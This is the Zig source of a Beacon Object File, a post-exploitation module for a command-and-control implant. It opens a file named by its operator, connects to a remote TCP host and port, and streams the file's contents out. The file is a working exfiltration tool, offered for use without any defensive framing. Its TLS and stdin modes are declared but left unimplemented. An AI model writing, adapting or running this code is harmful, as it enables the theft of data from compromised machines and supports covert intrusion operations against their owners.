const std = @import("std");
const posix = @import("std").posix;
const bofapi = @import("bof_api");
const beacon = bofapi.beacon;

comptime {
    @import("bof_api").embedFunctionCode("memcpy");
    @import("bof_api").embedFunctionCode("memmove");
    @import("bof_api").embedFunctionCode("memset");
    @import("bof_api").embedFunctionCode("__stackprobe__");
}

// BOF-specific error codes
const BofErrors = enum(u8) {
    AccesDenied = 0x1,
    NoArgsProvided,
    BadArgsProvided,
    NotSupportedAddressType,
    ConnectionError,
    DataTransferError,
    UnknownError,
};

const AddressType = enum(u8) {
    OPEN = 0x1,
    CREATE,
    STDIN,
    TCP,
    TLS,
    UNRECOGNIZED,
};

fn checkAddressType(addr_type: []const u8) AddressType {
    if(std.mem.eql(u8, "OPEN", addr_type)) {
        return AddressType.OPEN;
    } else if(std.mem.eql(u8, "CREATE", addr_type)) {
        return AddressType.CREATE;
    } else if(std.mem.eql(u8, "TCP", addr_type)) {
        return AddressType.TCP;
    } else if(std.mem.eql(u8, "TLS", addr_type)) {
        return AddressType.TLS;
    }
    else
        return AddressType.UNRECOGNIZED;
}

pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
    @import("bof_api").init(adata, alen, .{});

    if (alen == 0) {
        return @intFromEnum(BofErrors.NoArgsProvided);
    }

    const allocator = std.heap.page_allocator;

    var parser = beacon.datap{};
    beacon.dataParse(&parser, adata, alen);

    var srcAddrType: AddressType = undefined;
    var src_addr_iter: std.mem.SplitIterator(u8, .scalar) = undefined;

    var sinkAddrType: AddressType = undefined;
    var sink_addr_iter: std.mem.SplitIterator(u8, .scalar) = undefined;

    const src_address = std.mem.sliceTo(beacon.dataExtract(&parser, null).?, 0);
    const sink_address = std.mem.sliceTo(beacon.dataExtract(&parser, null).?, 0);

    if (!std.mem.eql(u8, "", src_address)) {

        if(std.mem.eql(u8, "-", std.mem.sliceTo(src_address, 0)))
            srcAddrType = AddressType.STDIN;

        src_addr_iter = std.mem.splitScalar(u8, std.mem.sliceTo(src_address, 0), ':');
        const addrPrefix = src_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);

        srcAddrType = checkAddressType(addrPrefix);
        if (srcAddrType != AddressType.OPEN)
            return @intFromEnum(BofErrors.NotSupportedAddressType);

        const file_path = src_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
        const file = std.fs.openFileAbsolute(file_path, .{ .mode = .read_only }) catch return 1;

        var recv_buffer: [4096]u8 = undefined;
        var file_r = file.reader(&recv_buffer);
        const file_r_iface = &file_r.interface;

        if (!std.mem.eql(u8, "", sink_address)) {

            sink_addr_iter = std.mem.splitScalar(u8, std.mem.sliceTo(sink_address, 0), ':');
            const sinkPrefix = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);

            sinkAddrType = checkAddressType(sinkPrefix);
            if (!(sinkAddrType == AddressType.TCP or sinkAddrType == AddressType.TLS))
                return @intFromEnum(BofErrors.NotSupportedAddressType);

            const host = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
            const port = std.fmt.parseUnsigned(u16, sink_addr_iter.next() orelse return 1, 10) catch return 1;

            const tcp = std.net.tcpConnectToHost(allocator, host, port) catch return @intFromEnum(BofErrors.ConnectionError);
            defer tcp.close();

            var tcp_buf: [4096]u8 = undefined;
            var tcp_w = tcp.writer(&tcp_buf);

            _ = file_r_iface.streamRemaining(&tcp_w.interface) catch @intFromEnum(BofErrors.DataTransferError);
        }
    }

    return 0;
}
